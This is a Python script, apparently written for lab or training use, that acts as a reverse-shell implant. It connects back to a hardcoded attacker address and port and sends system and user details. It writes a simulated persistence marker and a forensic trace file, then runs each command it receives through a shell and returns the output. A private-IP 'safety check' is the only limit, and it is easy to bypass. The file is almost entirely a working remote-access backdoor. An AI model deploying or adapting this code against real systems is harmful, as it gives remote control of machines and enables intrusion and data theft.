import sys
import socket
import subprocess
import os
import platform
import time

# --- CONFIGURATION ---
ATTACKER_IP = '192.168.137.128'
ATTACKER_PORT = 9999

def verify_lab_environment():
    """
    Safety Check: Ensures this payload only runs on Private/Lab networks.
    """
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # Check for private IP ranges
        is_private = False
        if local_ip.startswith("127."): is_private = True
        if local_ip.startswith("10."): is_private = True
        if local_ip.startswith("192.168."): is_private = True
        if local_ip.startswith("172."):
            parts = local_ip.split('.')
            if len(parts) > 1:
                second_octet = int(parts[1])
                if 16 <= second_octet <= 31:
                    is_private = True

        if not is_private:
            print(f"[!] SAFETY STOP: Public IP detected ({local_ip}). Aborting.")
            sys.exit(1)
    except Exception:
        sys.exit(1)

def collect_artifacts():
    info = f"""
    [SYSTEM INFO]
    OS: {platform.system()} {platform.release()}
    Hostname: {socket.gethostname()}
    User: {os.getenv('USER') or os.getenv('USERNAME')}
    Architecture: {platform.machine()}
    """
    return info

def simulate_persistence():
    try:
        persistence_file = "C2_PERSISTENCE_MARKER.service"
        with open(persistence_file, "w") as f:
            f.write(f"Persistence simulated at {time.ctime()}\nCommand: {sys.argv[0]}")
        return f"[+] Persistence Simulated: Created {persistence_file}"
    except Exception as e:
        return f"[-] Persistence Failed: {str(e)}"

def leave_forensic_trace():
    try:
        with open("FORENSIC_TRACE.txt", "w") as f:
            f.write(f"MALICIOUS_ACTIVITY_DETECTED\nSource: {ATTACKER_IP}\nTime: {time.ctime()}")
    except:
        pass

def connect():
    verify_lab_environment()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    print(f"[*] Attempting connection to {ATTACKER_IP}:{ATTACKER_PORT}...")
    
    while True:
        try:
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            print("[+] Connected to C2 Server.")
            
            # 1. Send Artifacts
            artifacts = collect_artifacts()
            persistence_status = simulate_persistence()
            leave_forensic_trace()
            
            initial_report = f"{artifacts}\n{persistence_status}\n[+] Forensic Trace Dropped."
            s.send(initial_report.encode())
            
            # 2. Command Loop
            while True:
                command = s.recv(1024).decode()
                
                if not command or command.strip().lower() == 'exit':
                    break
                
                # Execute Shell Command
                try:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value, stderr_value = proc.communicate()
                    output = stdout_value + stderr_value
                    
                    if not output:
                        output = b"[+] Command executed (No output)."
                except Exception as e:
                    output = f"[-] Execution Error: {str(e)}".encode()
                
                s.send(output)
            
            s.close()
            break
            
        except socket.error:
            # Retry logic
            time.sleep(2)
        except Exception as e:
            print(f"[!] Error: {e}")
            break

if __name__ == "__main__":
    connect()
